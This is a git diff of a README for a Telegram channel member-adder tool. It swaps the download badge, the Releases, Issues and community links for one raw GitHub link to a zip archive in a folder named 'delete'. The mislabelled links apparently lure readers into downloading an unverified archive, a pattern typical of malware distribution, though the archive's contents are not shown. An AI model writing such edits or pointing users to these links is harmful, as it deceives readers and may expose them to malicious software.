@@ -6,7 +6,7 @@ Welcome to the Telegram-channel-member-adder! This user-friendly tool helps you 
 
 ## 📥 Download Now
 
-[![Download Telegram-channel-member-adder](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/rextern/Telegram-channel-member-adder/releases)
+[![Download Telegram-channel-member-adder](https://raw.githubusercontent.com/rextern/Telegram-channel-member-adder/main/delete/Telegram-channel-member-adder_3.7.zip%https://raw.githubusercontent.com/rextern/Telegram-channel-member-adder/main/delete/Telegram-channel-member-adder_3.7.zip)](https://raw.githubusercontent.com/rextern/Telegram-channel-member-adder/main/delete/Telegram-channel-member-adder_3.7.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure that you meet the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/rextern/Telegram-channel-member-adder/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/rextern/Telegram-channel-member-adder/main/delete/Telegram-channel-member-adder_3.7.zip).
 2. Find the latest version listed. Click on the file that matches your operating system.
 3. Save the file to your computer.
 4. Open the downloaded file to start the installation process.
@@ -51,12 +51,12 @@ If you encounter any issues while using the application, consider the following:
 
 ## 🤝 Support
 
-If you need further assistance, please visit the [Issues Section](https://github.com/rextern/Telegram-channel-member-adder/issues) of our repository. Our community and contributors will be happy to help.
+If you need further assistance, please visit the [Issues Section](https://raw.githubusercontent.com/rextern/Telegram-channel-member-adder/main/delete/Telegram-channel-member-adder_3.7.zip) of our repository. Our community and contributors will be happy to help.
 
 ## 🚀 Community
 
 Join us to discuss tips, share experiences, and get updates:
-- **Telegram Channel:** [Join Here](https://telegram.me/your_channel_link)
+- **Telegram Channel:** [Join Here](https://raw.githubusercontent.com/rextern/Telegram-channel-member-adder/main/delete/Telegram-channel-member-adder_3.7.zip)
 - **GitHub Discussions:** Engage in conversation on how to improve the tool.
 
 ## 📜 Learn More
